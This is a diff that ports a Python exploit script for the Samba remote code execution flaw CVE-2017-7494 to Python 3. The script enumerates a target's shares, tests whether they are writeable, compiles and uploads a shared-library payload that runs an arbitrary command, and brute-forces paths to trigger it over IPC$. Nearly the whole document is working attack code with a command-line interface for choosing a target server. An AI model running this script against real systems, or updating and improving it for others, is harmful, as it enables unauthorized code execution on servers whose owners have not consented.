@@ -8,7 +8,7 @@
 # Tested on: Ubuntu 16.04
 # CVE : CVE-2017-7494
 
-import commands
+import subprocess
 import sys
 import re
 import smbclient
@@ -34,28 +34,31 @@ def generate_payload(file_name, cmd):
     payload.close()
 
     compile_cmd = "gcc %s.c -shared -fPIC -o %s.so" % (file_name, file_name)
-    (status, output) = commands.getstatusoutput(compile_cmd)
+    res = subprocess.run(compile_cmd.split(), capture_output=True, text=True)
+    status = res.returncode
+    output = res.stdout
     if status == 0:
-        print "[*] Generate payload succeed: %s.so" % (os.path.dirname(os.path.realpath(__file__)) + '/' + file_name)
+        print("[*] Generate payload succeed: %s.so" % (os.path.dirname(os.path.realpath(__file__)) + '/' + file_name))
         return file_name
     else:
-        print "[!] Generate payload failed!"
+        print("[!] Generate payload failed!")
         exit()
 
 def connect_smb(server, share_name):
     smb = smbclient.SambaClient(server=server, share=share_name)
     return smb
 
-def verify_writeable_directory(smb):
+def verify_writeable_directory(smb, share_name):
     file_name = temp_file_name
     temp_file = open(file_name, 'w')
     temp_file.write('test')
     temp_file.close()
     smb.upload(file_name, file_name)
     if file_name in smb.listdir("/"):
+        print("Directory " + share_name + " is writeable")
         try:
             smb.remove(file_name)
-        except Exception, err:
+        except Exception as err:
             pass
         return True
     return False
@@ -65,7 +68,7 @@ def upload_payload(smb, cmd):
     payload = generate_payload(payload_name, cmd)
     try:
         smb.upload(payload + '.so', payload + '.so')
-    except Exception, err:
+    except Exception as err:
         pass
     os.remove(payload + '.so')
     os.remove(payload + '.c')
@@ -78,24 +81,27 @@ def brute_force_location(payload):
     return paths
 
 def exploit(server, path):
-    print "[+] Brute force exploit: %s" % path
+    print("[+] Brute force exploit: %s" % path)
     cmd = "smbclient //%s/IPC$ -k -c 'open %s'" % (server, path)
-    (status, output) = commands.getstatusoutput(cmd)
+    res = subprocess.run(cmd.split(), capture_output=True, text=True)
+    status = res.returncode
+    output = res.stdout
 
 def scan_share(server, share_name, cmd):
+    print("Scanning share: " + share_name)
     try:
         smb = connect_smb(server, share_name)
-        if verify_writeable_directory(smb):
+        if verify_writeable_directory(smb, share_name):
             payload = upload_payload(smb, cmd)
             paths = brute_force_location(payload)
             for path in paths:
                 exploit(server, path)
             try:
                 smb.remove(payload + '.so')
-            except Exception, err:
+            except Exception as err:
                 pass
         smb.close()
-    except Exception, err:
+    except Exception as err:
         pass
 
 def main():
@@ -112,7 +118,7 @@ def main():
     # CVE-2017-7494
     # Help: python sambahunter.py -h
 """
-    print banner
+    print(banner)
     parser = argparse.ArgumentParser()
     parser.add_argument("-s", "--server", help="Server to target", type=str)
     parser.add_argument("-c", "--command", help="Command to execute on target server", type=str)
@@ -127,26 +133,29 @@ def main():
         cmd = args.command
 
     if server and cmd:
-        print "[*] Exploiting RCE for Samba (CVE-2017-7494)..."
-        print "[*] Server: %s" % server
+        print("[*] Exploiting RCE for Samba (CVE-2017-7494)...")
+        print("[*] Server: %s" % server)
         list_share_cmd = "smbclient -L %s -N" % (server)
-        (status, output) = commands.getstatusoutput(list_share_cmd)
+        res = subprocess.run(list_share_cmd.split(), capture_output=True, text=True)
+        status = res.returncode
+        output = res.stdout
         if status == 0:
+            print(output)
             shares = output.split('\n\t')
             for share in shares:
                 if 'Samba' in share:
                     match = re.search('.*(Samba.*?)].*', share)
                     if match:
-                        print "[*] Samba version: %s" % match.group(1)
+                        print("[*] Samba version: %s" % match.group(1))
                 for type in share_type:
                     if type.lower() in share.lower():
                         share_name = share.split(" ")[0]
                         scan_share(server, share_name, cmd)
-            print "[*] Exploit finished!"
+            print("[*] Exploit finished!")
         else:
-            print "[!] Exploit failed!"
+            print("[!] Exploit failed!")
             exit()
-        os.remove(temp_file_name)
+        #os.remove(temp_file_name)
 
 if __name__ == '__main__':
     main()
